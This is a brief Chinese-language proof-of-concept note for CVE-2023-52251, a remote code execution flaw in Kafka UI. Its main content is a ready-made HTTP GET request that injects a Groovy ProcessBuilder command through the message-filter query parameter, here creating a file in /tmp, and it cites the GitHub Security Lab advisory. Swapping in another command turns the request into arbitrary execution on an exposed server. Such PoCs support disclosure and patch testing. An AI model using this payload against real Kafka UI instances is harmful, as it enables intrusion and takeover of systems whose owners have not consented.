## Apache-Kafka的UI中的远程代码执行CVE-2023-52251

Kafka UI 受到远程代码执行漏洞的影响。消息过滤组件中导致执行任意未沙盒化的 Groovy 脚本

## poc

```
GET /api/clusters/local/topics/topic/messages?q=new+ProcessBuilder%28%22touch%22%2C%22%2Ftmp%2Fpwnd.txt%22%29.start%28%29&filterQueryType=GROOVY_SCRIPT&attempt=7&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING HTTP/1.1
Host: 127.0.0.1:8091
```

![image](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262238236.png)



## 漏洞来源

- https://securitylab.github.com/advisories/GHSL-2023-229_GHSL-2023-230_kafka-ui/